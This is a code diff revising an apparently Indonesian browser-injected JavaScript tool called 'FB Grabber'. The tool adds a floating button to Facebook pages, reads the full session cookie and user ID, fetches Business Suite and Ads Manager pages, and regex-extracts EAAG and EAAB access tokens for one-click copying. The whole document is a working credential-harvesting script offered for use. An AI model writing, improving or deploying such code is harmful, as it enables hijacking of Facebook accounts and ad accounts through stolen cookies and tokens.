@@ -1,5 +1,5 @@
 (function() {
-    // 1. Injeksi CSS (UI Responsif & Glow Effect)
+    // 1. Injeksi CSS (Tampilan Mobile Friendly)
     const style = document.createElement('style');
     style.textContent = `
         #floatBtn { 
@@ -7,123 +7,105 @@
             width: 14vw; height: 14vw; background: #0866FF; 
             border-radius: 50%; display: flex; align-items: center; 
             justify-content: center; cursor: pointer; font-size: 6vw; 
-            box-shadow: 0 4px 15px rgba(8,102,255,0.5); border: 0.5vw solid white; 
+            box-shadow: 0 4px 15px rgba(0,0,0,0.4); border: 0.5vw solid white; 
         }
         #guard-modal {
             position: fixed; top: 0; left: 0; 
             width: 100vw; height: 100vh; background: #f0f2f5; 
             z-index: 2147483646; padding: 5vw; box-sizing: border-box; 
-            display: none; overflow-y: auto; font-family: -apple-system, sans-serif;
+            display: none; overflow-y: auto; font-family: sans-serif;
         }
         .section-box { background: white; padding: 4vw; border-radius: 3vw; margin-bottom: 4vw; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
-        .section-title { font-size: 4.5vw; font-weight: bold; color: #1c1e21; margin-bottom: 4vw; border-left: 1vw solid #0866FF; padding-left: 2vw; }
-        .access-label { font-size: 3.2vw; font-weight: bold; color: #65676b; display: block; margin-bottom: 1.5vw; }
-        
+        .access-label { font-size: 3.5vw; font-weight: bold; color: #65676b; display: block; margin-bottom: 1.5vw; }
         .access-area { 
-            width: 100%; height: 18vw; font-size: 3vw; border-radius: 2vw; 
+            width: 100%; height: 20vw; font-size: 3vw; border-radius: 2vw; 
             padding: 3vw; box-sizing: border-box; background: #f5f6f7; 
             color: #050505; border: 1px solid #ddd; resize: none; margin-bottom: 3vw; 
-            font-family: 'Courier New', monospace !important; word-break: break-all;
+            font-family: monospace !important; word-break: break-all;
         }
-
         .btn-main { 
             width: 100%; padding: 4vw; background: #0866FF; color: white; 
-            border-radius: 2vw; border: none; font-weight: bold; font-size: 4vw; 
-            transition: 0.3s;
+            border-radius: 2vw; border: none; font-weight: bold; font-size: 4.5vw; 
         }
-        .btn-main:active { background: #0055d4; transform: scale(0.98); }
-        #mStatus { position: sticky; bottom: 2vw; background: rgba(0,0,0,0.8); color: white; padding: 2vw; border-radius: 10vw; text-align: center; display: none; }
+        #mStatus { position: fixed; bottom: 5vw; left: 50%; transform: translateX(-50%); background: #333; color: white; padding: 2vw 5vw; border-radius: 10vw; display: none; z-index: 2147483647; }
     `;
     document.head.appendChild(style);
 
-    // 2. Struktur HTML
+    // 2. Struktur HTML (Mirip Screenshot Berhasil)
     const container = document.createElement('div');
     container.innerHTML = `
         <div id="floatBtn">🚀</div>
         <div id="guard-modal">
-            <div style="text-align:center; margin-bottom:6vw; padding-top:2vw;">
-                <h1 style="font-size:8vw; font-weight:900; color:#0866FF; margin:0;">FB <span style="color:#1c1e21;">Grabber</span></h1>
-                <p style="font-size:3vw; color:#65676b;">Click box to copy data</p>
-            </div>
-
+            <h1 style="text-align:center; font-size:8vw; color:#0866FF;">FB <span style="color:#333;">Grabber</span></h1>
             <div class="section-box">
-                <div class="section-title">Account Data</div>
-                <button id="mGetAccess" class="btn-main">GET ACCESS TOKEN (EAAG)</button>
-                
+                <button id="mGetAccess" class="btn-main">FETCH DATA SEKARANG</button>
                 <div id="contentAccess" style="display:none; margin-top:5vw;">
-                    <label class="access-label">USER ID (UID):</label>
-                    <textarea id="resId" class="access-area" readonly placeholder="Click Fetch..."></textarea>
+                    <label class="access-label">Cookie :</label>
+                    <textarea id="resCookie" class="access-area" readonly></textarea>
                     
-                    <label class="access-label">COOKIE FULL:</label>
-                    <textarea id="resCookie" class="access-area" readonly placeholder="Click Fetch..."></textarea>
-                    
-                    <label class="access-label">ACCESS TOKEN (EAAG):</label>
-                    <textarea id="resToken" class="access-area" readonly placeholder="Buka business.facebook.com dulu!" style="height:30vw; color:#d33;"></textarea>
+                    <label class="access-label">Token EAAG :</label>
+                    <textarea id="resTokenEAAG" class="access-area" readonly placeholder="Fetching EAAG..."></textarea>
+
+                    <label class="access-label">Token EAAB :</label>
+                    <textarea id="resTokenEAAB" class="access-area" readonly placeholder="Fetching EAAB..."></textarea>
+
+                    <p style="font-size:4vw; font-weight:bold;">Facebook id : <span id="resId" style="color:#0866FF;">-</span></p>
                 </div>
             </div>
-            <div id="mStatus">Notification</div>
         </div>
+        <div id="mStatus">Copied!</div>
     `;
     document.body.appendChild(container);
 
-    // 3. Logika JS
     const modal = document.getElementById('guard-modal');
     const floatBtn = document.getElementById('floatBtn');
-    const status = document.getElementById('mStatus');
+    const statusNotif = document.getElementById('mStatus');
 
-    floatBtn.onclick = () => {
-        modal.style.display = (modal.style.display === 'block') ? 'none' : 'block';
+    floatBtn.onclick = () => modal.style.display = (modal.style.display === 'block') ? 'none' : 'block';
+
+    const showNotif = (msg) => {
+        statusNotif.innerText = msg;
+        statusNotif.style.display = 'block';
+        setTimeout(() => { statusNotif.style.display = 'none'; }, 1500);
     };
 
-    // Fungsi Notifikasi
-    function showNotif(msg, color = "white") {
-        status.innerHTML = `<span style="color:${color}">${msg}</span>`;
-        status.style.display = 'block';
-        setTimeout(() => { status.style.display = 'none'; }, 2000);
-    }
+    const copyToClipboard = (val) => {
+        const temp = document.createElement('textarea');
+        temp.value = val;
+        document.body.appendChild(temp);
+        temp.select();
+        document.execCommand('copy');
+        document.body.removeChild(temp);
+        showNotif("📋 Berhasil Disalin!");
+    };
 
+    // 3. Logika Ambil Data (Sesuai Kebutuhan)
     document.getElementById('mGetAccess').onclick = async () => {
-        // Ambil UID & Cookie
-        const uid = document.cookie.match(/c_user=(\d+)/)?.[1] || "LOGIN DULU BOS";
-        document.getElementById('resId').value = uid;
+        const uid = document.cookie.match(/c_user=(\d+)/)?.[1] || "Not Found";
+        document.getElementById('resId').innerText = uid;
         document.getElementById('resCookie').value = document.cookie;
-        
-        // Ambil Token EAAG (Logic Spesifik Business Suite)
+
+        // Ambil Token EAAG (Business Suite)
         try {
-            const resp = await fetch('https://business.facebook.com/content_management');
-            const text = await resp.text();
-            const tokenMatch = text.match(/(EAAG[a-zA-Z0-9]+)/);
-            
-            if (tokenMatch) {
-                document.getElementById('resToken').value = tokenMatch[1];
-                document.getElementById('resToken').style.color = "#008a1e";
-                showNotif("✅ Data Berhasil Diambil!", "#00df1f");
-            } else {
-                document.getElementById('resToken').value = "GAGAL! Buka tab business.facebook.com dulu baru klik tombol ini.";
-                document.getElementById('resToken').style.color = "red";
-                showNotif("❌ Token Tidak Ditemukan", "red");
-            }
-        } catch (e) {
-            document.getElementById('resToken').value = "Error: Pastikan berada di domain Facebook.";
-            showNotif("⚠️ Terjadi Kesalahan", "orange");
-        }
+            const res = await fetch('https://business.facebook.com/content_management');
+            const html = await res.text();
+            const eaag = html.match(/(EAAG[a-zA-Z0-9]+)/)?.[1];
+            document.getElementById('resTokenEAAG').value = eaag || "Gagal ambil EAAG (Coba buka business.facebook.com dulu)";
+        } catch (e) { console.error(e); }
+
+        // Ambil Token EAAB (Ads Manager/Lainnya)
+        try {
+            const res2 = await fetch('https://www.facebook.com/adsmanager/manage/campaigns');
+            const html2 = await res2.text();
+            const eaab = html2.match(/(EAAB[a-zA-Z0-9]+)/)?.[1];
+            document.getElementById('resTokenEAAB').value = eaab || "EAAB Tidak Ditemukan";
+        } catch (e) { console.error(e); }
 
         document.getElementById('contentAccess').style.display = 'block';
     };
 
-    // Fungsi Klik Langsung Copy
-    const setupCopy = (id) => {
-        const el = document.getElementById(id);
-        el.onclick = function() {
-            if (!this.value || this.value.includes("Error")) return;
-            this.select();
-            document.execCommand('copy');
-            showNotif("📋 Berhasil Disalin!");
-        };
-    };
-
-    setupCopy('resId');
-    setupCopy('resCookie');
-    setupCopy('resToken');
-
+    // Setup Klik untuk Copy
+    ['resCookie', 'resTokenEAAG', 'resTokenEAAB'].forEach(id => {
+        document.getElementById(id).onclick = function() { copyToClipboard(this.value); };
+    });
 })();
